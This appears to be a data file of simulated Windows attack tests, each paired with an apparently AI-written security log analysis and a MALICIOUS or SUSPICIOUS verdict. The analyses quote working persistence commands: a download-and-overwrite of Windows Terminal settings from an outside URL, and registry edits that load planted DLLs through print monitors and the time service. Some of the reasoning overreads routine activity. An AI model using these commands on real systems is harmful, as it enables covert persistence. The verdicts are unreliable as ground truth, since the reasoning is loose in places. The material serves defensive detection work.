- The command is structured to appear benign but its purpose, to elevate privileges by adding an email to 'Company Administrator,' indicates potential malicious intent. The use of hardcoded passwords, even in a supposed secure string, further raises the suspicion level as these can be leveraged by an attacker.

#### Sysmon Log:
- **EventID 1 and 5**: Processes such as `powershell.exe`, `wevtutil.exe`, and `whoami.exe` are executed by a user `admin_test` closely within a short time frame. The initiating process for PowerShell is `wsmprovhost.exe`, indicating a remote management session, potentially for administrative tasks but could also be leveraged for attacks.

- The specific PowerShell command executed corresponds to the one found in the PowerShell logs, confirming the execution of the privilege escalation command.

- **Additional Processes**: Multiple invocations of `conhost.exe` alongside critical system utilities suggest multiple command windows executing scripts almost simultaneously, possibly to modify logs or settings (`wevtutil.exe` is used to clear or query event logs).

#### System Log:
- Lists updates being applied by the `NT AUTHORITY\SYSTEM` user, which might be standard system operation. However, the rapid sequential execution aligns with the time frame of the suspicious PowerShell activities.

### Assessment:
The presence of PowerShell activities aimed at credential manipulation and privilege escalation, coupled with the use of tools such as `wevtutil.exe` and `whoami.exe` to potentially survey and clean the environment, gives strong indicators of malicious activity. The attempts to escalate privileges using PowerShell further confirm the actor's intent to gain unauthorized access or control over sensitive configurations within the system.

### Identified Threats/Risks:
- **Unauthorized Privilege Escalation**: Attempt to add an unauthorized user to a highly privileged role using PowerShell scripting.
- **Credential Exposure**: Use and manipulation of potentially hard-coded passwords in scripts.
- **Invasion Tools Usage**: Usage of system tools like `wevtutil.exe` to possibly alter or remove event logs traces.

### Resolution:
**MALICIOUS**

### Guidance:
1. **Immediate Review and Monitoring**:
   - Confirm the legitimacy of the PowerShell script and the necessity of the actions performed.
   - Monitor for further unauthorized login attempts or privilege assignments.

2. **User Account Audit**:
   - Immediately audit the `admin_test` account and any associated accounts for unauthorized access or behaviors.
   - Reset credentials for any accounts potentially exposed.

3. **Enhance Security Measures**:
   - Implement stricter PowerShell logging and execution policies.
   - Ensure advanced threat protection mechanisms are in place (e.g., Microsoft Defender ATP) to detect and respond to similar threats in the future.

4. **Incident Response**:
   - Initiate a thorough incident investigation to understand the full scope of the breach.
   - Involve IT security teams to handle and mitigate potential data exposure or misuse."
Persistence by modifying Windows Terminal profile,"After thoroughly analyzing the provided Windows event logs from the Sysmon, PowerShell, Application, System, and Security event channels, here are the key findings:

1. **Unusual PowerShell Activity:**
   - The logs show the execution of PowerShell with the following command:
     ```
     ""powershell.exe"" & {mv ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json ~\AppData\Local\Temp\settings.json, Invoke-WebRequest \\\""https://github.com/file/file-file/blob/master/files/data.015/src/settings.json?raw=true\\\"" -OutFile \\\""~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json\\\"", wt.exe}
     ```
   - This command performs a file move operation and an invocation of a web request to download a file from an external URL. Such operations using PowerShell, especially accessing external URLs, can often be indicative of malicious behavior, such as downloading malicious scripts or files.

2. **Process Execution Context:**
   - The majority of the processes, including PowerShell, were executed under the user context of ""SERVER002\admin_test"" with high integrity level, suggesting administrative privileges were used.
   
3. **Frequent Use of `wevtutil.exe` and `conhost.exe`:**
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` executions. Although these are legitimate Windows processes, the frequent inter-connectivity between them is unusual and might suggest an attempt to interact or manipulate event logs, thereby possibly covering tracks.

4. **Download from External Source:**
   - The use of `Invoke-WebRequest` in PowerShell is being used to directly access an external URL from GitHub, which is specified in the logs, is not typical behavior for standard system operations and can be a method used by attackers to fetch scripts or additional payloads.

Considering the data and operations identified in the logs, especially the use of PowerShell to fetch and modify files from an external source, I assess the situation with the following resolution:

**Resolution: SUSPICIOUS**

### Recommendations to Proceed:
- **Further Investigation:**
  - Isolate the host to prevent potential lateral movement or data exfiltration.
  - Conduct a thorough investigation of the PowerShell scripts fetched and executed to determine intent and content.
  - Check network traffic logs to identify any unauthorized or unusual outbound connections, specifically related to the external URLs noted.
  - Examine user activity and history for ""SERVER002\admin_test"" to determine if this aligns with expected behavior.

- **Host Remediation:**
  - If malicious activity is confirmed, proceed with cleaning or reimaging the affected system.
  - Update antivirus and endpoint detection tools to catch similar scripts or patterns in the future.

- **Security Enhancement:**
  - Implement PowerShell logging and blocking policies that can identify unauthorized usage.
  - Ensure thorough auditing and monitoring of administrative actions on critical systems.

This resolution is given with the understanding that further analysis will better determine the complete nature of this activity."
Add Port Monitor persistence in Registry,"### Detailed Analysis

#### Security Log
- The entries in the security log primarily focus on event ID 4616, which is related to the system time change. The time change was initiated by a process executed under the ""LOCAL SERVICE"" user, specifically `svchost.exe` running in the `C:\Windows\System32` directory. This activity appears benign since it aligns with standard system time correction executed by the Windows Time service using `svchost.exe`.

#### Sysmon Log
- **Sysmon Event ID 5 (Process Termination):**
  - Multiple processes, such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and others, were executed by the `SERVER002\admin_test` user. These processes, being standard Windows utilities, don't necessarily indicate malicious activity when viewed in isolation.
  
- **Sysmon Event ID 1 (Process Creation):**
  - A suspicious command executed by `cmd.exe` was detected:
    - `""cmd.exe"" /c reg add ""hklm\system\currentcontrolset\control\print\monitors\file"" /v ""Driver"" /d ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\bin\PortMonitor.dll"" /t REG_SZ /f`
    - This command attempts to add a registry key potentially indicative of DLL hijacking or persistence tactic, adding a DLL to a printer monitor port, which is a known persistence mechanism.
    - This type of registry modification is often used by adversaries to maintain persistence on a system.
  
- **Microsoft Edge Update Activity:**
  - Various processes related to Microsoft Edge Update were executed, mostly under the `NT AUTHORITY\SYSTEM` user. They seem to follow a legitimate process flow for updating Microsoft Edge, including several instances of `MicrosoftEdgeUpdate.exe`.

#### Application Log
- The logs show entries for the service ""edgeupdate"" stopping twice. This event itself is not inherently suspicious but suggests a legitimate software update process was in motion, aligning with the Sysmon logs related to Edge Update.

#### System Log
- Records indicate changes related to time synchronization activities executed by the `svchost.exe` process. Again, this activity correlates with regular system operations.

### Assessment and Resolution

**Risks and Threats Identified:**
- The entry involving the registry modification using `reg.exe` is a known potential persistence method. This action could signify malicious intent, as it indicates an unauthorized attempt to load a DLL file from a non-standard directory, which could be part of a malware's installation routine.

### Final Resolution
**MALICIOUS**

**Guidance:**
- It is advisable to thoroughly investigate the source and purpose of the registry modification related to the printer monitor DLL. Specifically, review any files within the referenced directory `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\bin\` and track modifications for unauthorized manipulations.
- As part of incident response, consider isolating the affected host, checking for additional persistence mechanisms, and performing a forensic analysis to understand the attack vector fully.
- Review the security posture and practices surrounding registry change detections and enforce regulations if necessary with endpoint protection solutions."
Azure - adding service principal to Azure role in subscription,"Upon analyzing the provided logs, several observations can be made:

### PowerShell Logs:
- The PowerShell logs indicate a script execution involving Azure operations, such as importing the Az.Resources module, securing passwords, connecting with credentials, and handling Azure service principals and role assignments.
- A plain text password ""p4sswd"" is being converted to a secure string, which is a poor security practice and could signify credential exposure risk.
- Azure operations and interactions, such as assigning roles to service principals, are sensitive actions. The script checks for existence and assigns roles if not found, which could be legitimate or malicious depending on the context.

### Security Logs:
- The Security logs predominantly show Event ID 4798, which audits queries for local group membership.
- Notably, the process `CompatTelRunner.exe` is repeatedly querying various local accounts, including Administrator and special accounts like DefaultAccount, sshd, etc. This behavior is unusual for a system compatibility tool, potentially indicating malicious enumeration activity.
  
### Sysmon Logs:
- There are recurring executions of legitimate Windows processes (e.g., `powershell.exe`, `conhost.exe`, `svchost.exe`) by the user `SERVER002\admin_test`.
- The execution of `CompatTelRunner.exe` is performed under the `NT AUTHORITY\SYSTEM` account, a privileged context, which aligns with the security log entries. This could be typical for scheduled tasks, but considering its concurrency with membership queries, it may hint at malicious behavior.

### Assessment:
- The PowerShell script details and role assignments could be concerning, but would need to be reviewed within the operational context of the user `jonh@contoso.com` to rule out standard administrative tasks.
- The `CompatTelRunner.exe` doing group enumeration is a stronger indicator of suspicious behavior because it appears to misuse a legitimate process to perform actions that aren't typically part of its functionality.
  
### Guidance and Resolution:
- **Resolution: SUSPICIOUS** - The logs indicate suspicious activities, primarily due to suspicious enumeration activity. This needs further investigation to confirm if the actions were authorized or if `admin_test` account credentials have been compromised.
- **Next Steps:**
  - Verify the intention and execution context of the PowerShell script and confirm whether it was conducted by legitimate permission from `jonh@contoso.com`.
  - Review and investigate the source and purpose of the `CompatTelRunner.exe` enumeration activities.
  - Consider monitoring and investigating user activities associated with the `admin_test` account.
  - Review security configurations and scheduled tasks to assess the necessity and behavior of `CompatTelRunner.exe`."
TinyTurla backdoor service w64time,"From the analysis of the provided logs, several indicators suggest potential malicious activity:

1. **Time Manipulation:**
   - In the Security and System logs, multiple events (Event ID 4616) indicate system time changes, which can be suspicious if performed outside of authorized maintenance windows. Manipulating system time is a common tactic to evade detection or manipulate timestamp-dependent behaviors.

2. **Creation and Configuration of a Suspicious Service:**
   - A command executed via `cmd.exe` (Sysmon Event ID 1 with ProcessId 3128) creates a service called ""W64Time"" using `sc.exe`, configuring it to automatically start and using a non-standard executable path for time-related services. This is unusual since typical time services should relate to legitimate Windows time synchronization services, not custom DLLs.
   - The service is associated with an unfamiliar DLL `w64time.dll` and runs under `svchost.exe`, using command lines and registry modifications to embed itself persistently, indicating possible DLL hijacking or replacement.

3. **Privilege and Process Activity:**
   - The user ""admin_test"" has been granted sensitive privileges (Event ID 4672) such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc., commonly associated with access needed for malicious activities.
   - Processes initiated by ""admin_test"" using `cmd.exe` with the approach to register a potentially malicious service, further backed up by evidence of registry manipulations using `reg.exe` to configure service settings, strongly indicates compromise.

4. **Behavioral Indicators:**
   - Execution of multiple critical and administrative tools—such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe`—closely following these suspicious activities might be indicative of lateral movement or system reconnaissance.

**Risk Assessment and Guidance:**

Based on the above observations, there are several strong indicators of a security compromise, specifically related to persistence mechanisms being established through unauthorized service creation and execution of suspicious scripts and tools.

- **Resolution: MALICIOUS** - The combination of unauthorized time manipulation, suspicious service creation and execution with elevated privileges, and various administrative tools indicate a high level of threat which strongly suggests malicious activity.

**Steps to Proceed:**
1. **Immediate Investigation**: Isolate the affected system (Server002) to prevent further potentially harmful actions by the suspected service and user account.
2. **Malware Analysis**: Conduct a deeper analysis of the `w64time.dll` file to determine its nature and behavior.
3. **Incident Response**: Initiate a full forensic investigation to identify initial access vector, tools used, and potential data exfiltration.
4. **Review and Revoke Privileges**: Audit the permissions granted to ""admin_test"" and other users for any excessive or unauthorized elevated privileges.
5. **System Remediation**: Back up important data, perform a thorough cleanse of the affected system, and consider a full clean reinstallation of the operating system to mitigate potential backdoors or ongoing threats."
Create shortcut to cmd in startup folders,"### Analysis of Logs

#### 1. **PowerShell Activity:**
   - The PowerShell logs indicate a script execution to create a shortcut in the startup directory. The script attempts to create two shortcuts, both targeting `cmd.exe`, in the startup folder for the `APPDATA` and `ProgramData` directories. This is often a method used to persist a malicious executable to run each time the system starts. 
   - This PowerShell command is coupled with `New-Object -ComObject (""WScript.Shell"")` which is used to interface with Windows shell functionality and is sometimes leveraged in attacks to create shortcuts or manipulate system operations.

#### 2. **Sysmon Logs:**
   - The Sysmon logs show multiple executions of `wevtutil.exe` and `conhost.exe`, which are common processes. However, the frequent launch of `whoami.exe` and `hostname.exe` is peculiar given their parent process `wsmprovhost.exe`, which might indicate more background information gathering, potentially by an unauthorized entity.
   - Particularly concerning is the creation of processes associated with Edge Update in a temporary folder (`C:\Program Files (x86)\Microsoft\Temp\EUD6ED.tmp\MicrosoftEdgeUpdate.exe`), as this might indicate an attempt to execute or store updates outside the controlled path. 

#### 3. **Time Synchronization:**
   - The system and security logs show time adjustments performed by the time service using `ntp`. The adjustments align with normal system operation and do not inherently indicate malicious activity.

#### Conclusion and Recommendation

- **Assessment:** The combination of PowerShell activity creating suspicious shortcuts in startup folders, coupled with the manipulation of system utilities and unexpected process parent-child relationships, particularly involving background system profile tools such as `whoami.exe` and `hostname.exe`, heavily suggests potential malicious behavior. The use of temporary directories for executing or installing software like Edge Update can also indicate a technique known as living-off-the-land, where attackers use legitimate processes for malicious purposes.
  
- **Resolution:** **MALICIOUS**

- **Recommendation:** Immediate steps should be taken to contain the threat:
  1. **Terminate suspicious PowerShell sessions** and remove the `.lnk` files from the startup directories.
  2. **Isolate the affected machine** from the network to prevent any potential lateral movement.
  3. **Conduct a forensic analysis** of the system to identify any persistence mechanisms or backdoors that might have been installed.
  4. **Review and update endpoint protection** configurations to detect and prevent such activities, particularly focusing on monitoring PowerShell, `wsmprovhost.exe`, and unexpected usage of temporary directories for executable processes.
  5. **Communicate with the relevant teams** to enforce security awareness regarding email attachments and downloads that may lead to such breaches. 

This approach not only addresses the immediate issue but also strengthens future defenses against similar incidents."
Edit an existing time provider,"After thoroughly analyzing the provided Windows event logs, here's a detailed assessment and findings:

### Suspicious Activity Identified:

1. **PowerShell Execution**:
    - Multiple PowerShell logs indicate the execution of a script with the following command:
      ```plaintext
      powershell.exe & {net stop w32time, Copy-Item ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileTest.dll"" C:\Users\Public\fileTest.dll, reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\fileTest.dll"" /f, reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f, reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f, net start w32time}
      ```
    - This involves stopping a service, copying a DLL from a temporary location to a public directory, modifying the registry to reference this DLL, and restarting the service. This behavior is highly suspect as it mimics known persistence techniques used by malicious actors to insert and execute custom, potentially malicious DLLs via legitimate Windows services.

2. **Registry Alterations**:
    - The events in the Sysmon logs corroborate the PowerShell activity, as they show registry modifications related to the W32Time (Windows Time) service to use `fileTest.dll`, a DLL that was copied maliciously.
    - Making registry changes to service configurations, especially time services, indicates an attempt to maintain persistence or to execute code with system privileges.

3. **Process Executions**:
    - Numerous instances of `net.exe`, `net1.exe`, and `reg.exe` are executed around the same timestamp as the PowerShell script, indicating these tools were likely used in the script execution, per the command details in the logs.

4. **Error and Module Issues**:
    - System logs indicate the Time Service (NtpServer) failed to start due to the specified module being unavailable, which aligns with the attempt to insert a malicious DLL.

### Conclusion
Based on the evidence from the logs, the specific PowerShell script execution designed to manipulate the Windows Time service and register suspicious DLL files as providers is a clear indicator of malicious activity. This amount of process handling, registry manipulation, and service alteration is not typical of benign administrative tasks.

### Recommendation
- **Resolution: MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Containment**:
   - Isolate the affected machine ('Server002') from the network to prevent further malicious activities or lateral movement.
   
2. **Malware Analysis**:
   - Analyze the `fileTest.dll` for malicious content or payload.

3. **Registry and System Restore**:
   - Restore affected registry entries to their baseline values prior to modification.
   - Consider restoring system services configurations from a known good backup.

4. **Audit and Monitoring**:
   - Conduct a full audit of the system and additional systems for similar unauthorized changes.
   - Increase monitoring for similar activities across the network to quickly detect potential threats.

5. **Incident Response**:
   - Initiate incident response procedures to understand the initial compromise vector.
   - Evaluate user permissions and access logs to ensure accounts like ""admin_test"" or others were not leveraged for unauthorized access.

The activities observed required immediate attention and remediation to protect the integrity of the system in question and any connected network infrastructure."
Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry,"Upon analyzing the Windows event logs provided for the host ""Server002,"" there are several indicators of suspicious and potentially malicious activity:

1. **Registry Modification via PowerShell**:
   - There is evidence of PowerShell scripts modifying registry entries related to security settings. The command attempts to change 'Security Packages' in the registry to ""AtomicTest.dll,"" which is highly suspicious and indicative of malicious activity such as credential theft or system manipulation. This pattern of behavior is often associated with credential harvesting attempts.

2. **Frequent Use of Wevtutil**:
   - The `wevtutil` utility was used multiple times to clear event logs across different channels (e.g., System, Security, Application). This is a strong indication of an attempt to cover tracks, commonly seen in post-exploitation scenarios to hide evidence of malicious activity.

3. **Event Log Clearing**:
   - Logs for system, security, and PowerShell channels were cleared (`EventID 104` in System logs and `EventID 1102` in Security logs). This signifies potential malicious activity attempting to obfuscate malicious actions.

4. **Multiple EdgeUpdate Process Executions**:
   - There are various executions of `MicrosoftEdgeUpdate.exe` and related binaries. While these typically indicate an update process, the frequent and repeated execution alongside suspicious activity should be investigated further to ensure this is legitimate behavior and not being used by malicious actors to exert persistence.

5. **Time Changes**:
   - The security logs indicate several modifications in system time, which can be typical behavior for tampering with timestamps to evade detection in log analysis.

**Assessment**:
Based on the provided logs, the activities present are strongly indicative of malicious behavior. The use of PowerShell for registry manipulation, alongside event log clearing across multiple channels, suggests a sophisticated attempt to compromise and maintain access to the system while masking actions.

**Resolution**: MALICIOUS - The logs distinctly contain activity that can be classified as malicious.

**Guidance on How to Proceed**:
- **Immediate Incident Response**: Isolate the machine, and conduct a deep forensic analysis to determine the scope and potential access by unauthorized actors.
- **Credential Rotation**: Due to potential credential theft attempts, reset credentials, especially for users who accessed or managed this machine.
- **Review and Harden PowerShell Logging**: Ensure that PowerShell logging is enabled for both 'LogScriptBlockExecution' and 'ModuleLogging' for more visibility.
- **Restricted Usage of Admin Tools**: Audit the usage of admin-like utilities and tools (`wevtutil`, `wsmprovhost`, `svchost`) on workstations and servers.
- **Continuous Monitoring**: Deploy continuous monitoring tools to detect anomalous behaviors in real-time for immediate threat detection and response.

This analysis should prompt immediate corrective actions to secure the environment and prevent further exposure or damage."
HKLM - Append Command to Winlogon Userinit KEY Value,"Upon analyzing the provided Windows event logs for potential indicators of malicious activity, the following points were identified:

### Suspicious PowerShell Activity:
- The logs indicate that a PowerShell script was executed to modify the Windows registry key responsible for the Userinit value, which is typically used for user logon scripts.
- The script backs up the original Userinit value and appends the path to `calc.exe` (Calculator application) to it. This change can potentially be used as a persistence mechanism by attackers, whereby a seemingly benign application is executed with elevated privileges during user login.
- The execution of PowerShell commands with the intent to modify registry autostart locations is often a behavior associated with malware or persistence tactics.

### System Monitoring via Sysmon:
- Multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user ""SERVER002\\admin_test"". While `wevtutil.exe` is used for managing event logs, and `conhost.exe` is related to console applications, the context and frequency could imply attempts to modify or view event logs, possibly covering tracks.
- Notably, no explicit malicious behavior is flagged by Sysmon, but the frequent invocation of `wevtutil.exe` could warrant further investigation to rule out log tampering.

### Software Activity:
- There are logs related to Microsoft Edge Updates, which appear to be legitimate software updates by the Microsoft Edge Installer service. This activity doesn't exhibit any signs of malicious intent but is standard software maintenance expected in a Windows environment.

### Assessment:
- The focal point of concern lies within the PowerShell activity, primarily the use of PowerShell to modify the `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` registry key to execute additional applications at user login. This activity is potentially malicious and atypical in standard operations.
- Although not every instance of this behavior is guaranteed to be nefarious, in this context, the registry modification is a classic sign of privilege escalation or persistence technique often used by malware.

### Resolution:
Given the registry modification via PowerShell intended to trigger the execution of additional programs post-login, the situation is best categorized as follows:

- **MALICIOUS**: Due to indicators of persistence tactics used through unauthorized registry modification impacting Userinit at startup.

### Guidance:
- Immediately review and restore the proper Userinit registry key values to prevent unauthorized execution.
- Conduct a thorough security review of the affected system and cross-verify for any additional irregularities or unauthorized changes.
- Initiate a broader investigation to determine if this is an isolated event or part of a larger compromise.
- Increase monitoring and deploy additional security measures to prevent similar future events.
- Educate users on atypical behaviors like phishing attempts that might lead to such unauthorized script executions."
Azure AD Application Hijacking - Service Principal,"Upon analyzing the provided Windows event logs, I have identified several factors that indicate potentially malicious activity:

### Indicators of Suspicious and Malicious Activity:

1. **PowerShell Scripting with Suspicious Behavior:**
   - **Credential Exposure:** The PowerShell logs show the creation of credentials using `ConvertTo-SecureString` with plaintext password input (`p4sswd`), which is a suspicious practice as it can expose credentials in script logs or memory.
   - **Application Hijacking Claim:** The script includes statements like `Write-Host ""Application Hijacking worked. Logged in successfully...""`, which strongly suggest attempts to gain unauthorized access or escalate privileges within the AzureAD context.
   - **Certificate Manipulation:** The script generates a self-signed certificate and uses it for `New-AzureADServicePrincipalKeyCredential`, potentially indicating an attempt to bypass security controls or implant backdoors.

2. **Sysmon Logs Indicating Execution of Utility Tools and Scripts:**
   - **Process Execution:** Several system processes like `powershell.exe`, `hostname.exe`, `wevtutil.exe`, and `whoami.exe` are executed in quick succession by a user associated with an administrative account (`SERVER002\\admin_test`). 
   - **Wevtutil Usage:** The event log utility (`wevtutil.exe`) is used in a manner that suggests automated log querying or manipulation, often seen in adversaries attempting to cover tracks.

3. **Process Relationships:**
   - The involvement of `wsmprovhost.exe`, which typically indicates a Windows Remote Management (WinRM) operation, raises concerns about possible remote execution or management scripting activities in conjunction with PowerShell.

### Assessment of Situation:

- **Malicious Activity Detected:** The combination of scripted access, credential manipulation, certificate generation, and suspicious logging messages strongly indicates malicious intent or post-exploitation activities.

### Guidance and Next Steps:

- **Resolution: MALICIOUS**
  - **Immediate Action:** Initiate an incident response to understand the full scope of compromise.
  - **Containment:** Obstruct the network access for the involved systems to prevent further lateral movement.
  - **Eradication:** Remove any unauthorized accounts, credentials, or scripts created by the attacker.
  - **Recovery:** Evaluate and restore system integrity from a known good state or backup, and monitor for any indicators of repeated access attempts.
  - **Further Investigation:** Utilize full packet capture or endpoint detection tools to trace potential attacker paths and artifacts. Conduct a thorough review of access logs for unusual behavior across other systems in the network.
  - **Prevention:** Implement stricter PowerShell script monitoring, credential hygiene practices, and adhere to the principle of least privilege to mitigate recurrence."
Creating Boot Verification Program Key for application execution during successful boot,"Upon analyzing the provided logs, here is the detailed assessment focusing on indicators of potential compromise or malicious activity:

1. **Time Manipulation Events**:
    - The logs from the **System** and **Security** categories indicate that there were multiple instances of system time being modified backward (EventID 24 in the System log and EventID 4616 in the Security log), which were carried out by `svchost.exe` with `LOCAL SERVICE` privileges.
    - Manipulation of system time can be used to evade logging or create confusion over log timelines, which could be suspicious under certain contexts.

2. **Potential Malicious Registry Modification**:
    - The **Sysmon** log shows a `cmd.exe` process executing a command to add a registry entry to modify the BootVerificationProgram for `iexplore.exe` (EventRecordID 17977).
    - This action can potentially be used to maintain persistence by ensuring specific applications are executed during system restarts. It is conducted by `admin_test`, indicating an administrative privilege was used.

3. **Edge Update Activities**:
    - There are numerous events related to **Microsoft Edge Update**, which may be benign if an update for Microsoft Edge was planned (`MicrosoftEdgeUpdate.exe` and related processes). However, frequent creation of numerous short-lived processes could potentially mask malicious activity if an adversary leverages legitimate auto-update mechanisms.

4. **Processes Spawned by admin_test**:
    - The user `admin_test` is involved in executing several system utilities, such as `cmd.exe`, `wevtutil.exe`, `conhost.exe`, and `whoami.exe`. While these are legitimate processes, they could be used in a script or by an attacker for information gathering or system configuration manipulation.
    - The presence of `SeDebugPrivilege` and other powerful privileges under `admin_test` account could be concerning if the account's usage pattern is not expected within this context.

5. **Privilege Assignment**:
    - **EventID 4672** logs `admin_test` being assigned multiple high privileges, including `SeDebugPrivilege`, which could be leveraged for intrusive actions, further indicating potential exploitation.

After analyzing these logs, the overall evaluation of the situation regarding the provided logs is:

- **Resolution: SUSPICIOUS**

   The activity of time modification, registry changes with `cmd.exe`, the use of high privileges by `admin_test`, and the relatively noisy activities around `MicrosoftEdgeUpdate.exe` prompt concerns. While there are legitimate operations, some events suggest that further investigation is needed to rule out misuse or unauthorized access.

**Guidance:**
- Investigate the necessity and context of time changes. Verify if they align with any system maintenance or patching activities.
- Verify the legitimacy of registry changes. Check if they relate to any legitimate operations or application settings adjustments.
- Confirm the activities around `admin_test` are expected, especially the assignment of high privileges and execution of commands that can change system settings.
- Review the update mechanism logs for Microsoft Edge to ensure processes are legitimate and no rogue binaries are executed."
